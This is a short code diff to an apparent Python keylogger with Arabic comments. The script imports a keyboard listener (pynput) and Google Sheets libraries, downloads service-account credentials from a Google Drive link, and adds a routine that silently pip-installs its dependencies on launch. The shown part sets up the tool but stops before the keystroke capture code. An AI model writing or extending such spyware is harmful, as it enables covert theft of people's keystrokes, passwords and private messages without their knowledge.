@@ -1,8 +1,31 @@
+import os
+import subprocess
+import sys
 import gspread
 from oauth2client.service_account import ServiceAccountCredentials
 import pynput.keyboard
 import threading
 import requests
+
+# التأكد من تثبيت المكتبات الضرورية
+def install_libraries():
+    try:
+        import gspread
+        import oauth2client
+        import pynput
+    except ImportError:
+        print("بعض المكتبات مفقودة، يتم تثبيتها الآن...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "gspread", "oauth2client", "pynput"])
+
+# التحقق من وجود بايثون
+def check_python():
+    if not sys.executable:
+        print("Python غير مثبت. الرجاء تثبيت Python يدويًا.")
+        return False
+    return True
+
+# استدعاء دالة تثبيت المكتبات
+install_libraries()
 
 # رابط Google Drive لتنزيل credentials.json
 url = "https://drive.google.com/uc?export=download&id=1ewzx0przRvr1VuEh6wlgwUZYE-bj8hvJ"
